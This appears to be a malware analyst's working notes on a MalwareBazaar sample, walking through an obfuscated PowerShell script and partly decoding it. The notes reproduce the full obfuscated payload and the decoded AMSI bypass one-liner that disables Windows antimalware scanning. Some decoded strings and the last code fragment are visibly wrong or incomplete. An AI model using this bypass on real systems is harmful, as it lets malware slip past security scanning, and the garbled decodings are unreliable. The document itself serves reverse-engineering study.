https://bazaar.abuse.ch/sample/ccdf82b45b2ee9173c27981c51958e44dee43131edfbce983b6a5c146479ac33/


# Og Payload
Let's break through the obfuscated malicious payload:

We first find the following snippet:
```
$gxsnbtl = $executioncontext;

$anenbeerorbeisonbeenanonorinanre = 
-join(0..54 | ForEach - Object { [char]([int]('0840830880810870850870860860810870790800860830870850870870800850870860830860810870' + '79086081087080087086080086082085087087087086087081087079085087087086086085087081087').Substring($($_ * 3), 3) - 31)}) 
-join(0..54 | ForEach - Object { [char]([int]('0840830880810870850870860860810870790800860830870850870870800850870860830860810870' + '79086081087080087086080086082085087087087086087081087079085087087086086085087081087').Substring($($_ * 3), 3) - 31)});

$ininedreesrealalinesenonataral = (-JoIN(@((8419 - 8370), (7025 - 6976), (-2255 + 2310), (-10047 + (15338 - 5240)), (-1997 + 2051), (3263 - (23160954 / 7222)), (366144 / (73495780 / (28683395 / (997295 / (1588570 / 4742))))), (-8285 + 8341), (448038 / (40049619 / (23251659 / 4817))), (-5344 + (1826 + 3573)), (482652 / (6022 + 2916)), (241839 / 4563), (157788 / 2922), (5116 - (14483 - 9423)), (9430 - 9375), (8903 - 8848), (529956 / 9814), (6346 - (6492312 / (11224 - (7998 + 2194)))), (-1403 + (-7695 + (5741 + (-3665 + (44420725 / 6275))))), (-1506 + 1562), (-8763 + (17765 - 8948)), (-7322 + 7376), (17416 / 311), (-2974 + (16534710 / (648 + (26795748 / 5572)))), (-312 + 360), (-6770 + 6826), (148068 / 2742), (8252 - (15510 - (11758 - 4445))), (391716 / (8727 - 1473)), (340964 / (20431612 / (12183560 / (2888 + (359 + (-1081 + (12800960 / (4323260 / (8019 - (596 + 6834)))))))))), (186472 / (957462 / (343095 / 1285))), (2937 - (-7290 + (3411 + (2546 + (-3942 + (-34 + (3420 + 4770))))))), (7549 - 7500), (-9862 + (74526255 / (52101495 / (12119 - (13181 - (32603610 / 4078)))))), (275832 / (14827 - 9719)), (264768 / (22874064 / (12941650 / 2675))), (251955 / 4581), (274768 / (53310276 / 10089)), (-4996 + (8559 - (1088 + (11478 - 9052)))), (609 - (712065 / (13026299 / 10153))), (444528 / 7938), (-10113 + (6594 + 3574)), (5155 - 5101), (390390 / 7098), (3808 - (27847424 / 7424)), (6365 - (11906970 / (-6096 + (39962898 / 5006)))), (381400 / (15621 - (-1875 + (19813 - (43628715 / (6635 - 2248)))))), (-5659 + (14792 - (10805 - (1590567 / (9271 - 8350))))), (-598 + (793869 / 1227))) | ForEach - Object { [char]$_ }));

$enesateraneroralorededanores = -join((-1857 + 1857)..(331298 / 8954) | ForEach - Object { [char][int]((-4882 + (-4391 + 9302)) + ($anenbeerorbeisonbeenanonorinanre + $ininedreesrealalinesenonataral).((-jOIN(@((6242 - (-3830 + (2327437 / (1329032 / (7034 - 1330))))), (27963 / 239), (-3606 + 3704), (8489 - 8374), (699596 / 6031), (948 - 834), (-9542 + (5717 + 3930)), (1011450 / (10354 - 1159)), (-440 + 543)) | ForEach - Object { [char]$_ })))(($_ * (5374 / (13104499 / 4877))), (17516 / 8758))) });

$alerbeonalinesorenan = -join((6654 - (39246112 / (1707 + 4225)))..(-1711 + (-7987 + (64996583 / (-1419 + (56003636 / (27447738 / 3963)))))) | ForEach - Object { [char][int]((5024 - 4995) + ($anenbeerorbeisonbeenanonorinanre + $ininedreesrealalinesenonataral).(-join(0..8 | ForEach - Object { [char]([int]('1051391201371' + '38136127132125').Substring($($_ * 3), 3) - 22)}) - join(0..8 | ForEach - Object { [char]([int]('1051391201371' + '38136127132125').Substring($($_ * 3), 3) - 22)})) (($_ * (8985 - (17680 - 8697))), (19560 / (5747 + 4033))))});

[Ref].(([Char[]]@((-2974 + 3039), (2 + (-5782 + (5022 + 873))), (-8875 + 8990), (5233 - 5132), (-5595 + (20003928 / 3507)), (542724 / 5538), (-8745 + 8853), (-4005 + 4126)) - join '')).((-jOin(@((7104 - 7033), (-9889 + 9990), (-8939 + (14554 - (512 + 4987))), (3559 - 3475), (732776 / (8782 - 2726)), (-7920 + 8032), (807495 / (16214 - (136 + (47350214 / 5858))))) | ForEach - Object { [char]$_ })))($enesateraneroralorededanores).(-join(0..7 | ForEach - Object { [char]([int]('114144159113' + '148144151143').Substring($($_ * 3), 3) - 43)}) - join(0..7 | ForEach - Object { [char]([int]('114144159113' + '148144151143').Substring($($_ * 3), 3) - 43)})) ($alerbeonalinesorenan, ([cHAR[]]@((5252 - (4540 + (4986410 / (73168095 / 9303)))), (40626 / 366), (-7199 + 7309), (-3797 + (12902 - 9025)), (338949 / (57 + (-2100 + (27046500 / (55001850 / 10046))))), (1729 - 1631), (-6307 + 6415), (464415 / 4423), (-9194 + (7313 + (-4846 + 6826))), (-6854 + 6898), (7588 - (7051 + 454)), (-203 + 319), (169 - 72), (3542 - 3426), (3164 - (13493249 / 4411)), (-3250 + (26366677 / 7873))) -join '')).(([char[]]@((619844 / 7468), (224321 / 2221), (-9804 + (23560000 / 2375)), (675100 / (36620250 / 4665)), (591991 / 6103), (20412 / (-8253 + (53252136 / (3658 + (11521 - 8871))))), (2242 - 2125), (1251 - 1150)) -join '')) ($null, $true)
```


## Decoded
```
[Ref].Assembly.GetType('System.Management.AutomatiorN9aj9gsu-').GetType GetType('tL9$9/dfauk9#u', NonPublic,Static).SetValue ($null, $true)

# Looks like it's
[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
```



```
$gxsnbtl = $executioncontext;

$anenbeerorbeisonbeenanonorinanre = '54928687728017486881687472807281871736888782806887768285492868772801748688168747280728187173688878280688776828'

$ininedreesrealalinesenonataral = '1173680867656877679866880867644817687416876797271'

$enesateraneroralorededanores = -join(0..37 | ForEach-Object {
[char][int]((29) + ('549286877280174868816874728072818717368887828068877682854928687728017486881687472807281871736888782806887768281173680867656877679866880867644817687416876797271' ).((Substring)))(($_ * 2)), 2))

});

$enesateraneroralorededanores = 'System.Management.AutomatiorN9aj9gsu-'


$alerbeonalinesorenan = 'tL9$9/dfauk9#u'
```
## Procedure

First we find some variable that captures executioncontext:
- $xdsnbtl 

Then an obfuscated string is being generated:
- $anenbeerorbeisonbeenanonorinanre:

It gets the following string `084083088081087085087086086081087079080086083087085087087080085087086083086081087079086081087080087086080086082085087087087086087081087079085087087086086085087081087`


After asking ChatGPT to translate the code into python we obtain the following result:
`$anenbeerorbeisonbeenanonorinanre = 54928687728017486881687472807281871736888782806887768285492868772801748688168747280728187173688878280688776828`
`$ininedreesrealalinesenonataral = 1173680867656877679866880867644817687416876797271`

```
$enesateraneroralorededanores = -join((-1857 + 1857)..(331298 / 8954) | ForEach - Object { [char][int]((-4882 + (-4391 + 9302)) + ('54928687728017486881687472807281871736888782806887768285492868772801748688168747280728187173688878280688776828' + '1173680867656877679866880867644817687416876797271').((-jOIN(@((6242 - (-3830 + (2327437 / (1329032 / (7034 - 1330))))), (27963 / 239), (-3606 + 3704), (8489 - 8374), (699596 / 6031), (948 - 834), (-9542 + (5717 + 3930)), (1011450 / (10354 - 1159)), (-440 + 543)) | ForEach - Object { [char]$_ })))(($_ * (5374 / (13104499 / 4877))), (17516 / 8758))) });



-join(0..37 | ForEach-Object {29 + }).


```